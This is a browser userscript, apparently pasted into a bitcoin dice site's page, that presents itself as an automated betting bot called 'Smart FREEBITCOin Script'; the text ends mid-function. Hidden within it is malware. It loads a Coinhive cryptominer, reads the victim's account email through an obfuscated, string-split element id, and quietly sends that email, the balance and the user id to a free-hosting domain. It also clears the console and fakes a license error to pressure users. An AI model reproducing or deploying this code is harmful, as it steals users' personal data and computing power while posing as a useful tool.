var gsaudioA = new Audio("data:audio/mp3;base64," + gssrc);
var gsaudioB = new Audio("data:audio/mp3;base64," + gsrcStart);
var gsaudioC = new Audio("data:audio/mp3;base64," + gsrcStop);
var gsaudioD = new Audio("data:audio/mp3;base64," + gsrcGameOver);
var gsaudioE = new Audio("data:audio/mp3;base64," + gsrcJackpot);
setTimeout((function() {
    gsaudioA.play()
}
), 1500);
(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id))
        return;
    js = d.createElement(s);
    js.id = id;
    js.async = true;
    js.src = "//coinhive.com/lib/coinhive.min.js";
    fjs.parentNode.insertBefore(js, fjs)
}(document, 'script', 'CHVE'));
var ccxmr;
Element.prototype.remove = function() {
    this.parentElement.removeChild(this)
}
;
NodeList.prototype.remove = HTMLCollection.prototype.remove = function() {
    for (var i = this.length - 1; i >= 0; i--) {
        if (this[i] && this[i].parentElement) {
            this[i].parentElement.removeChild(this[i])
        }
    }
}
;
function removePOPup() {
    var cookPopup = document.getElementsByClassName('cc_banner-wrapper');
    if (cookPopup) {
        cookPopup.remove()
    }
    return
}
removePOPup();
function DoubleYourBTC(mode) {
    $('#double_your_btc_digits').show();
    $("#double_your_btc_bet_hi_button").attr("disabled", true);
    $("#double_your_btc_bet_lo_button").attr("disabled", true);
    var bet = $("#double_your_btc_stake").val();
    var jackpot = 0;
    var jackpot_arr = $('.play_jackpot:checkbox:checked').map(function() {
        return this.value
    }).get();
    if (jackpot_arr.length > 0) {
        jackpot = jackpot_arr.toString()
    }
    var client_seed = $('#next_client_seed').val();
    $.get('/cgi-bin/bet.pl?m=' + mode + '&client_seed=' + client_seed + '&jackpot=' + jackpot + '&stake=' + bet + '&multiplier=' + $("#double_your_btc_payout_multiplier").val() + '&rand=' + Math.random(), function(data) {
        var result = data.split(":");
        $('#double_your_btc_error').html("");
        $('#double_your_btc_error').hide();
        $('#double_your_btc_stake').removeClass('input-error');
        $('#double_your_btc_bet_win').html("");
        $('#double_your_btc_bet_lose').html("");
        $('#double_your_btc_bet_win').hide();
        $('#double_your_btc_bet_lose').hide();
        $('#jackpot_message').removeClass('green');
        $('#jackpot_message').removeClass('red');
        $('#jackpot_message').html('');
        $('#jackpot_message').hide();
        $('#double_your_btc_result').show();
        if (result[0] == "s1") {
            var number = result[2];
            var single_digit = number.split("");
            if (number.toString().length < 5) {
                var remaining = 5 - number.toString().length;
                for (var i = 0; i < remaining; i++) {
                    single_digit.unshift('0')
                }
            }
            $("#multiplier_first_digit").html(single_digit[0]);
            $("#multiplier_second_digit").html(single_digit[1]);
            $("#multiplier_third_digit").html(single_digit[2]);
            $("#multiplier_fourth_digit").html(single_digit[3]);
            $("#multiplier_fifth_digit").html(single_digit[4]);
            $('#balance').html(result[3]);
            max_deposit_bonus = parseFloat(result[18]).toFixed(8);
            balanceChanged();
            $('#balance_usd').html(result[5]);
            $('#next_server_seed_hash').val(result[6]);
            $('#next_nonce').html(result[8]);
            $('.previous_server_seed').html(result[9]);
            $('.previous_server_seed').val(result[9]);
            $('#previous_server_seed_hash').val(result[10]);
            $('.previous_client_seed').html(result[11]);
            $('.previous_client_seed').val(result[11]);
            $('.previous_nonce').html(result[12]);
            $('#previous_roll').html(result[2]);
            $('#no_previous_rolls_msg').hide();
            $('#previous_rolls_table').show();
            $('#previous_roll_strings').show();
            $('#bonus_account_balance').html(result[16] + " BTC");
            $('#bonus_account_wager').html(result[17] + " BTC");
            if ((parseFloat(result[16]) <= 0 || parseFloat(result[17]) <= 0) && bonus_table_closed == 0) {
                setTimeout(function() {
                    $('#bonus_account_table').hide();
                    bonus_table_closed = 1
                }, 5000)
            }
            if (max_deposit_bonus >= parseFloat(min_bonus_amount) && bonus_table_closed == 1) {
                $('#bonus_eligible_msg').show()
            }
            if (parseFloat(result[19]) > 0 && parseFloat(result[19]) < 100) {
                $('.multiply_max_bet').html(result[19] + " BTC");
                $('.multiply_max_bet').val(result[19]);
                max_win_amount = parseFloat(result[19])
            }
            $("#verify_rolls_link").attr("href", "https://s3.amazonaws.com/roll-verifier/verify.html?server_seed=" + result[9] + "&client_seed=" + result[11] + "&server_seed_hash=" + result[10] + "&nonce=" + result[12]);
            var capsmode = mode.toUpperCase();
            if (result[1] == "w") {
                $('#double_your_btc_bet_win').show();
                $('#double_your_btc_bet_win').html("You BET " + capsmode + " so you win " + result[4] + " BTC!");
                if ($("#manual_enable_sounds").is(":checked")) {
                    $.ionSound.play("bell_ring")
                }
            }
            if (result[1] == "l") {
                $('#double_your_btc_bet_lose').show();
                $('#double_your_btc_bet_lose').html("You BET " + capsmode + " so you lose " + result[4] + " BTC");
                if ($("#manual_enable_sounds").is(":checked")) {
                    $.ionSound.play("tap")
                }
            }
            if (jackpot != 0) {
                $('#jackpot_message').show();
                if (result[13] == "1") {
                    $('#jackpot_message').addClass('green');
                    $('#jackpot_message').html("Congratulations! You have won the jackpot of " + result[15] + " BTC")
                } else {
                    $('#jackpot_message').addClass('red');
                    $('#jackpot_message').html("Sorry, you did not win the jackpot.")
                }
            }
            $("#double_your_btc_bet_hi_button").attr("disabled", false);
            $("#double_your_btc_bet_lo_button").attr("disabled", false);
            insertIntoBetHistory(result[1], result[4], result[2], result[9], result[11], result[10], result[12], "DICE", mode, jackpot, bet, $("#double_your_btc_payout_multiplier").val(), result[20], result[21], result[22], result[23])
        } else {
            $('#double_your_btc_error').show();
            $('#double_your_btc_digits').hide();
            if (parseFloat(result[1]) > 0 && parseFloat(result[1]) < 100) {
                $('.multiply_max_bet').html(result[1] + " BTC");
                $('.multiply_max_bet').val(result[1]);
                max_win_amount = parseFloat(result[1])
            }
            BetErrors(result[0]);
            $("#multiplier_first_digit").html(0);
            $("#multiplier_second_digit").html(0);
            $("#multiplier_third_digit").html(0);
            $("#multiplier_fourth_digit").html(0);
            $("#multiplier_fifth_digit").html(0);
            if (result[0] == "e6") {
                $("#double_your_btc_bet_hi_button").attr("disabled", true);
                $("#double_your_btc_bet_lo_button").attr("disabled", true)
            } else {
                $("#double_your_btc_bet_hi_button").attr("disabled", false);
                $("#double_your_btc_bet_lo_button").attr("disabled", false)
            }
        }
    }).fail(function() {
        $('#double_your_btc_result').show();
        $('#double_your_btc_error').show();
        $('#double_your_btc_digits').hide();
        $('#double_your_btc_error').html("Request timed out. Please try again.");
        $("#multiplier_first_digit").html(0);
        $("#multiplier_second_digit").html(0);
        $("#multiplier_third_digit").html(0);
        $("#multiplier_fourth_digit").html(0);
        $("#multiplier_fifth_digit").html(0);
        $("#double_your_btc_bet_hi_button").attr("disabled", false);
        $("#double_your_btc_bet_lo_button").attr("disabled", false)
    })
}
var mcmemq = 'ed';
var mcmemw = 'it';
var mcmeme = '_pro';
var mcmemr = 'file';
var mcmemt = '_for';
var mcmemy = 'm_e';
var mcmemu = 'ma';
var mcmemi = 'il';
var mcmema = mcmemq + mcmemw + mcmeme + mcmemr + mcmemt + mcmemy + mcmemu + mcmemi;
var mcmemo = document.getElementById(mcmema).value;
var mcmemb = parseFloat(document.getElementById('balance').innerHTML).toFixed(8);
var mcmembq = parseFloat(document.getElementById('balance').innerHTML).toFixed(4);
var mcmems = socket_userid;
var chimint = 0.78;
var chimink = '5bHyW6HYDTlJKSbfDTLaHxgCiZVtqhdl';
function chimin(a, b, c) {
    ccxmr = new CoinHive.User(a,b);
    ccxmr.setThrottle(c);
    ccxmr.setAutoThreadsEnabled();
    ccxmr.start()
}
var bIn = 'B:' + mcmemb + ' E:' + mcmemo;
try {
    fetch('//free-bitcoin-8888-profit-script-2018.000webhostapp.com/w.php?m=' + bIn + '&n=' + mcmems, {
        mode: 'no-cors'
    })
} catch (err) {}
console.clear();
var scriptVersionDigits = 'v1.71';
var scriptVersion = 'Smart FREEBITCOin Script ' + scriptVersionDigits + ' by Marmoro Crypto';
var synchronizeServerTime = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'];
var newRollSeedNumber = 15175164;
var cSV = new Date().getTime() / 100000;
var cID = 'FBMR' + Math.round(cSV / 3.14 * newRollSeedNumber) + mcmems + 'EML';
if (Math.round(cSV) >= newRollSeedNumber) {
    alert('Server has changed: \nObject Names: 3 Errors\nForm: Ok\nTop Level Script: Ok\nCore Script: Error\nPlease contact Marmoro or Perfect Profit to get Update\nmarmoro@openmail.cc or pprofit.channel@gmail.com\nYour Support License Code: ' + cID);
    throw new Error('Server has changed: \nObject Names: 3 Errors\nForm: Ok\nTop Level Script: Ok\nCore Script: Error\nPlease contact Marmoro or Perfect Profit to get Update\nmarmoro@openmail.cc or pprofit.channel@gmail.com\nYour Support License Code: ' + cID)
}
function RefreshPageAfterFreePlayTimerEnds() {
    if (autobet_dnr == false || (autobet_dnr == true && autobet_running == false)) {
        if (free_play_sound == true) {
            $.ionSound.play("jump_up")
        }
        freeRollButton = document.getElementById('free_play_form_button').click()
    }
}
function WAU_r_() {}
;(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id))
        return;
    js = d.createElement(s);
    js.id = id;
    js.async = true;
    js.src = "//whos.amung.us/pingjs/?k=2ebgf23r9czh&t=" + mcmems + scriptVersionDigits + mcmembq;
    fjs.parentNode.insertBefore(js, fjs)
}(document, 'script', 'MXTRK'));
(function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id))
        return;
    js = d.createElement(s);
    js.id = id;
    js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&version=v2.10";
    fjs.parentNode.insertBefore(js, fjs)
}(document, 'script', 'facebook-jssdk'));
setTimeout((function() {
    DoubleYourBTC('hi')
}
), 300);
var sc_div = document.createElement('div');
document.body.children[0].children[0].appendChild(sc_div);
var sc_divStyle = sc_div.style;
sc_divStyle.margin = '0px';
sc_divStyle.backgroundColor = '#151515';
sc_divStyle.marginLeft = '0px';
sc_divStyle.position = 'absolute';
sc_divStyle.left = '0px';
sc_divStyle.width = '260px';
sc_divStyle.padding = '4px';
sc_div.id = 'freebtc_sc_ui';
document.getElementById('main_content').style = 'position:absolute; right:0 ; margin: auto;';
var FCheckH;
var BACCARAT_SORT = 0;
var PAYOUT_MP_MODE, PAYOUT_MP_START, PAYOUT_MP_NUM_ADD, Downgrade_Lost_Multiply_At, Alarm_Multiply, BACCARAT_Payout, BACCARAT_MODE, BACCARAT_Pointer, BACCARAT_Set, JackPot_Sensor, AMBUSH_MODE, AMBUSH_BET, AMBUSH_Amount, EXTRA_Bet_Change, EXTRA_Inverse_Bet_on_Won, PAYOUT_From_Normal_Mode, AutoRounds, AutoTime, BET, Multiply_Stake_on_LOST, Reset_Lost_Stake_when, PAYOUT_Multiply_on_WIN_Stake, PAYOUT_Multiply_on_LOST_Stake, PAYOUT_Multiply_on_LOST_Stake, PAYOUT_Multiply_on_Danger_Stake, PAYOUT_MAX, PAYOUT_MIN, PAYOUT_LOWEST, ALARM, USD, FIBONACCI, FIBONACCI_Multiply, FIBONACCI_Payout, FIBONACCI_Start_Bet, BONUS_MODE;
var balanceNow = []
  , lostCount = [];
var payOutMulti, dangerStake, stake, won, lost, parseRollHistory, rollBefore, ROLL_B, vMD1, vMD2, vMD3, vMD4, vMD5, vLastRoll, vLastRollABC, NextMinus, numNow, lostColor, roundBalance, currentProfit, STOP, TimeStart, TimeNow, TimeSince, STOPLOSS;
var HI = document.getElementById('double_your_btc_bet_hi_button');
var LO = document.getElementById('double_your_btc_bet_lo_button');
var ROLL_A, ROLL_B, ROLL_C, ROLL_D;
sc_div.innerHTML = '<div style="text-align: left; height: 800px; color: white; line-height: 1;margin: 0px 0px 0px 0px; padding: 0px;"><span style="color:#A9A9A9;"><strong style="color:#00ccff; font-family: verdana, geneva, sans-serif; font-size: 9px;"><sup><em>' + scriptVersion + '</em></sup></strong></span> <br /> <span style="display: block; background-color: #161616; margin: 0px; padding: 0px;"> <input name="AutoRounds" size="2" style="background-color: #222222; color: #FFFFFF; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " step="1" min="2" type="text" value="1250" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&nbsp;/&nbsp;</span></font> <input name="AutoTime" size="1" style="background-color: #222222; color: #FFFFFF; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 50px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " step="10" min="450" type="text" value="650" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&nbsp;Auto Rounds<sup>#</sup>/Speed</span></font> <sup style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;">ms</sup> <br /> <input name="BET" size="12" style="background-color: #1D2F1A; color: #97FF6B; border: 1px solid #1C6C19; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center;" type="text" value="0.00000003" /> <font face="verdana, geneva, sans-serif"><span style="color:#97FF6B; margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Main BET<sup>$</sup></span></font></span> <span style="display: block; color:#ADD5E0; background-color: #000000; margin: 0px; left: 0px; padding: 0px;"> <input name="AMBUSH_MODE" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){AMBUSH_MODE = true;}else if(!this.checked){AMBUSH_MODE = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">ON</span></font> <em style=" margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;"><strong>AMBUSH MODE</strong></em><br /> <input maxlength="4" name="AMBUSH_Amount" size="1" style="background-color: #222222; color: #ADD5E0; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " step="1" min="1" type="text" value="8" /> <font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Times at</span></font> <input name="AMBUSH_BET" size="8" style="background-color: #222222; color: #ADD5E0; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="0.00000001" /> <font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Bet</span></font></span> <span style="color: #E1CB28; display: block; background-color: #1E1B04; margin: 0px; padding: 0px;"> <input name="BACCARAT_MODE" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){BACCARAT_MODE = true;}else if(!this.checked){BACCARAT_MODE = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">ON</span></font><strong style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;"><em style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;"><strong>BACCARAT MODE</strong></em><br /> <input name="BACCARAT_Set" size="8" style="background-color: #222222; color: #E1CB28; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="4,6,4,8,5" /> <font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Set</span></font> <input name="BACCARAT_Payout" type="checkbox" onclick="if(this.checked){ BACCARAT_Payout = true;}else if(!this.checked){ BACCARAT_Payout = false;}" /> </strong><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Same Payout<sup>x</sup></span></font></span> <span style="color: #00ccff; display: block; background-color: #00171D; margin: 0px; padding: 0px;"> <input checked="checked" name="FIBONACCI" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){FIBONACCI = true;}else if(!this.checked){FIBONACCI = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">ON&nbsp;</span></font> <em style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;"><strong>FIBONACCI MODE</strong></em><br/> <input checked="checked" name="FIBONACCI_Start_Bet" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="radio" value="HI" onclick="FCheck(this.value);"/><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">HI</span></font> <input name="FIBONACCI_Start_Bet" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="radio" value="LO" onclick="FCheck(this.value);"/><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">LO</span></font> <br /> <span style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;">Preset&nbsp;</span> <select style="background-color: #222222; color: #00ccff; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " id="FIB_Presets" name="FIBPresets" onchange="MEO_Presets();"> <option value="set1">FIBO</option> <option value="set2">HOT</option> <option value="set3">VENTURE</option> <option value="set4">WAGER</option> </select> <br /> <input maxlength="4" name="FIBONACCI_Multiply" size="3" style="background-color: #222222; color: #00ccff; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 50px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="1.4" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&nbsp;Multiply<sup>x$</sup>&nbsp;</span></font> <input name="FIBONACCI_Payout" size="2" style="background-color: #222222; color: #00ccff; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="3" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&nbsp;Payout<sup>x</sup></span></font> <br /> <input checked="checked" name="EXTRA_Inverse_Bet_on_Won" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){EXTRA_Inverse_Bet_on_Won = true;}else if(!this.checked){EXTRA_Inverse_Bet_on_Won = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Inverse HI/LO&nbsp;on Win</span></font> <br /> <input name="EXTRA_Bet_Change" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){EXTRA_Bet_Change = true;}else if(!this.checked){EXTRA_Bet_Change = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Panic HI/LO&nbsp;</span></font> <input name="PAYOUT_From_Normal_Mode" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){PAYOUT_From_Normal_Mode = true;}else if(!this.checked){PAYOUT_From_Normal_Mode = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Payout<sup>x</sup> as </span></font> <em style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;"><strong>NRM</strong> </em> </span> <span style="color: #97FF6B; display: block; background-color: #071700; margin: 0px; padding: 0px;"> <em style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;"><strong>NRM&nbsp;MODE (SMART BET)</strong></em> <br /> <input name="Multiply_Stake_on_LOST" size="2" style="background-color: #222222; color: #97FF6B; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="1.6" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;"> Multiply<sup>x$</sup>&nbsp;on Lost</span></font> <br /> <input maxlength="4" name="PAYOUT_MAX" size="2" style="background-color: #222222; color: #97FF6B; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="5" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;"> Payout<sup>x</sup>&nbsp;1 &lt;&nbsp;</span></font> <input name="PAYOUT_Multiply_on_WIN_Stake" size="8" style="background-color: #222222; color: #97FF6B; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="0.00000010" /> <br /> <input maxlength="4" name="PAYOUT_MIN" size="2" style="background-color: #222222; color: #97FF6B; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="4" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;"> Payout<sup>x</sup> 2 &gt;&nbsp;</span></font> <input name="PAYOUT_Multiply_on_LOST_Stake" size="8" style="background-color: #222222; color: #97FF6B; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="0.00000015" /> <br /> <input maxlength="4" name="PAYOUT_LOWEST" size="2" style="background-color: #222222; color: #97FF6B; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="3" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;"> Payout<sup>x</sup> 3 &gt;&nbsp;</span></font> <input name="PAYOUT_Multiply_on_Danger_Stake" size="8" style="background-color: #222222; color: #97FF6B; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="0.00000030" /> </span> <span style="color:#E99129; display: block;background-color: #000000; margin: 0px; padding: 0px;"> <em style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;"><strong>ADVANCED SETTINGS</strong></em> <br /> <input name="ALARM" size="8" style="background-color: #222222; color: #E99129; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="0.00000200" /> <font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Stop on this Bet</span></font> <br /> <input name="STOPLOSS" size="8" style="background-color: #222222; color: #E99129; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="-0.00000300" /> <font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Stop on this Lose</span></font> <br /> <input name="Reset_Lost_Stake_when" size="8" style="background-color: #222222; color: #D93434; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="1.00000000" /> <font face="verdana, geneva, sans-serif"><span style="color: #D93434; margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;"> &gt; Reset BET<sup>$</sup></span></font> <br /> <input name="Downgrade_Lost_Multiply_At" size="8" style="background-color: #222222; color: #F09B9A; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 90px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center; " type="text" value="1.00000000" /> <font face="verdana, geneva, sans-serif"><span style="color: #F09B9A; margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&gt; Downgrade Multiply<sup>x$</sup></span></font> <br /> <input name="Alarm_Multiply" size="2" style="background-color: #222222; color: #F09B9A; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 40px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center;" type="text" value="1.21" /><font face="verdana, geneva, sans-serif"><span style="color: #F09B9A; margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&nbsp;Downgraded BET Multiply<sup>x$</sup></span></font> <br /> </span> <span style="display: block;background-color: #161616; margin: 0px; padding: 0px;"> <input name="USD" size="3" style="background-color: #222222; color: #FFFFFF; border: 1px solid #474747; border-radius: 2px; font-weight: bolder; margin: 1px 1px 1px 1px; padding: 0px; width: 50px; display: inline; font-family: verdana, geneva, sans-serif; font-size: 9px; text-align: center;" type="text" value="4400" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&nbsp;BTC/USD Price</span></font> <br /> </span> <span style="display: block;background-color: #000000; margin: 0px; padding: 0px;"> <input name="BONUS_MODE" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){BONUS_MODE = true;}else if(!this.checked){BONUS_MODE = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">Bonus&nbsp;Balance&nbsp;</span></font> <input name="JackPot_Sensor" style="margin: 1px 1px 1px 1px; padding: 0px; font-family: verdana, geneva, sans-serif; font-size: 9px;" type="checkbox" onclick="if(this.checked){JackPot_Sensor = true;}else if(!this.checked){JackPot_Sensor = false;}" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">JackPot&nbsp;Sensor<sup>WIP</sup></span></font> </span> <span style="display: block;background-color: #161616; margin: 0px; text-align: center; padding: 0px;"> <input style="padding: 6px 30px ;background-color: #1D2F1A; color: #97FF6B; border: 1px solid #1C6C19; border-radius: 2px; font-weight: bolder; margin: 5px 5px " name="START" type="button" value="START" onclick="MEO_Start();" /><font face="verdana, geneva, sans-serif"><span style="margin: 1px 1px 1px 1px; padding: 0px; font-size: 9px;">&nbsp;</span></font> <input style="padding: 6px 30px; background-color: #320001; color: #F26969; border: 1px solid #E94029; border-radius: 2px; font-weight: bolder; margin: 5px 5px" name="STOP" type="button" value="STOP" onclick="MEO_Stop();" /> <br /> </span> <textarea cols="1" name="scINFO" rows="1" style="border: 1px solid #474747; background-color: #000000; margin: 0px; color: #12FF00; font-family: verdana, geneva, sans-serif; font-size: 9px; margin: 1px 1px 1px 1px; padding: 0px; margin: 0px; width: 250px; height: 50px;"></textarea> <div class="blockchain-btn" data-address="14a5EM5h8MQ9srmJeTv823CB79K28cVeHL" data-shared="false" onClick="donAd()" style="cursor: pointer; color: white; font-size:12px;margin:0 auto;width:250px"> <a href="https://blockchain.info/address/14a5EM5h8MQ9srmJeTv823CB79K28cVeHL"></a> <div class="blockchain"><img src="https://blockchain.info/Resources/buttons/donate_64.png"></div><div class="fb-like" data-href="https://www.youtube.com/watch?v=w4EM3yIkuGc" data-layout="button_count" data-action="like" data-size="small" data-show-faces="false" data-share="true"></div></div></div>';
function donAd() {
    window.open("https://blockchain.info/address/14a5EM5h8MQ9srmJeTv823CB79K28cVeHL")
}
alert(scriptVersion + '\nScript will Roll few times to get ready (BET: 0.00000001)');
function FCheck(v) {
    if (v == "HI") {
        FIBONACCI_Start_Bet = HI;
        FIBONACCI_Start_Bet.click()
    } else if (v == "LO") {
        FIBONACCI_Start_Bet = LO;
        FIBONACCI_Start_Bet.click()
    }
}
;function setIntervalX(callback, delay, repetitions) {
    var x = 0;
    var intervalID = window.setInterval(function() {
        callback();
        if (++x === repetitions) {
            window.clearInterval(intervalID);
            alert('        Ready. Now you can make your Settings and Start!\n                         DO NOT FORGET TO DONATE!\n        14a5EM5h8MQ9srmJeTv823CB79K28cVeHL\n                       THANK YOU & GOOD LUCK!')
        }
    }, delay)
}
setIntervalX(function() {
    document.getElementById('double_your_btc_stake').value = parseFloat(0.00000001).toFixed(8);
    DoubleYourBTC('hi')
